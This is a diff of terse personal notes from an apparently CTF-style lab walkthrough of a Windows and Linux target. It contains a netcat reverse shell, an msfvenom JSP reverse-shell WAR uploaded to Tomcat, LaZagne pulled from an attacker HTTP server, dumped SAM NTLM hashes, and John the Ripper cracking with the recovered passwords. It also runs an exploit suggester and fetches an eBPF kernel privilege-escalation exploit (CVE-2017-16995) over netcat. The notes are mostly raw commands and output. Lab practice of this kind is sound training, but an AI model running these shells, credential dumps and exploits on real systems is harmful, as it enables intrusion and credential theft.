@@ -124,27 +124,74 @@ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 4242 >/tmp/
 
 flag{f9038f}:
 https://www.hackingarticles.in/credential-dumping-sam/
-
-
 installed the LaZagne
+upload file runme in apache tomcat
+ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.2 LPORT=8484 -f war > runme.war
+listened on the runme server 
+nc -lvnp 8484
+started http server to upload my lazagne file into the machine
+python -m http.server 80  
+$URL = “http://192.168.0.2/LaZagne.exe”
+$Path=”C:\windows\temp\myfile.exe”
+./myfile.exe windows
+save output as hash.txt
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e666068d0bfe8cfb6d6c491834f78e0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+printer:1000:aad3b435b51404eeaad3b435b51404ee:44fa02794d20e21f23f7e69f6bccb89a:::
+razor:1002:aad3b435b51404eeaad3b435b51404ee:2d8882531a3f4d09e4bb77f1a914c31c:::
+hal:1003:aad3b435b51404eeaad3b435b51404ee:86b15ba3699800e1ae4467d3d873c780:::
+mr_babbage:1004:aad3b435b51404eeaad3b435b51404ee:7ad0bf8992acc858750b62c3d3abbac3:::
+phantom_phreak:1005:aad3b435b51404eeaad3b435b51404ee:1b5c137a88fc176acec58fe3c45c2c31:::
+blade:1006:aad3b435b51404eeaad3b435b51404ee:d96b4259ebecd51c45f3682d7deac476:::
+cereal_killer:1007:aad3b435b51404eeaad3b435b51404ee:bac2f953f298f4bd431f86e035ab656d:::
+crash_override:1008:aad3b435b51404eeaad3b435b51404ee:05294aaffd692513f3b6572bb0c1be06:::
+kate_libby:1009:aad3b435b51404eeaad3b435b51404ee:b2a37a0e225158d1aaec8fdc010266f1:::
+joey:1010:aad3b435b51404eeaad3b435b51404ee:3b5dbb0a35d66305f7383151d3b91046:::
+root:1011:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::
+
+used john the ripper 
+ john --format=NT --rules -w=/home/kali/Downloads/rockyou.txt hash.txt
+
+pass             username
+1234             (root)     
+                 (Guest)     
+manito           (razor)     
+consuela         (phantom_phreak)     
+refresher        (hal)     
+desman           (cereal_killer)     
+catacomb         (mr_babbage)     
+wolter           (kate_libby)     
+micrometer       (blade)     
+rapidly          (crash_override)     
+stu              (joey)  
+
+telnet 10.0.2.147
+the right user was joey
+flag{f9038fd090b8490c7d8b613f0df054ba0e6ff63a82e19b}.jpg
+-------------------------------------------------------------------------
+used linux exploit suggester
+find 
+
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+chmod +x les.sh 
+./les.sh --uname 'Linux matrix3-sea-turtle 4.13.0-21-generic #24-Ubuntu SMP Mon Dec 18 17:29:16 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux' 
 
 
++] [CVE-2017-16995] eBPF_verifier
 
-hashcat -h
+   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
+   Exposure: highly probable
+   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
+   Download URL: https://www.exploit-db.com/download/45010
+   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
 
-dictionary wordlist rockyou.txt download
-
-cat /etc/passwd
-
-cat /etc/shadow ---not worked
-
-ls -l /etc/shadow /usr/bin/passwd
-stat /usr/bin/passwd
-
-
-
-
-
+wget https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c
+nc -lvnp 2424
+ nc -w 5 192.168.0.2 2424 >eBPF.c
+flag{6be6ef286c041a489b9f681acdd8afebb441a9b22df584}.jpg
+----------------------------------------------------------------------
 
 
 
